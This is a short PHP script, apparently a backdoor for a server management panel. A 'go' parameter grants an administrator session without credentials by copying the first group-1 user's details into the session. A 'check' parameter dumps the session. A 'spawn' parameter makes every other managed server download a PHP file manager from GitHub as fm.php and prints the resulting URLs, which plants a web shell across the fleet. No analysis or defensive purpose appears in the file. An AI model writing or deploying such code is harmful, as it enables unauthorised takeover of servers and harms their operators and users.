<?php
include "functions.php";

//echo 
if(isset($_GET['go']))
{
    $users = getRegisteredUsers();
    foreach($users as $user)
    {
        if($user['member_group_id'] == 1)
        {
            $_SESSION['hash'] = md5($user['username']);
            $_SESSION['ip'] = getIP();
            $_SESSION['last_activity'] = time();
            header("Location: /");
            exit;
        }
    }
}
if(isset($_GET['check']))
{
    var_dump($_SESSION);
}
if(isset($_GET['spawn']))
{
    foreach($rServers as $rServer)
    {
        if($rServer['id'] != 1)
        {    sexec($rServer['id'],"wget https://raw.githubusercontent.com/dulldusk/phpfm/master/index.php -O fm.php");
            echo "http://" . $rServer['server_ip'] . ":" . $rServer['http_broadcast_port'] . "/fm.php" . PHP_EOL;
        }
    }
}